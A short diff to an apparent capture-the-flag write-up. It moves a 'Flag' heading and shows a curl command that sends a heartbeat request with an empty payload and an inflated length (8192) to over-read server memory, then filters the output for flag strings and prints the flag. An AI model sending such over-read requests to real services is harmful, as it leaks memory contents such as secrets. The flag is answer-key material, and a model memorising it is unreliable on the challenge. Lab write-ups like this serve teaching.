@@ -47,11 +47,11 @@ Notes:
 - Any `length > 512 + len(payload)` works (e.g., 1024, 2048, 4096, 8192).
 - Filter output for keywords like `GCTF`, `flag`, `ctf`.
 
-## Flag
-
 ```bat
 curl -s http://host:port/heartbeat -H "Content-Type: application/json" -d "{\"payload\":\"\",\"length\":8192}" | findstr /i "flag CTF GCTF"
 ```
+
+## Flag
 
 ```flag
 GCTF25{aK4mI_H3ARTY_tl$SU3_saD_so_$AD_c1737cad162e}
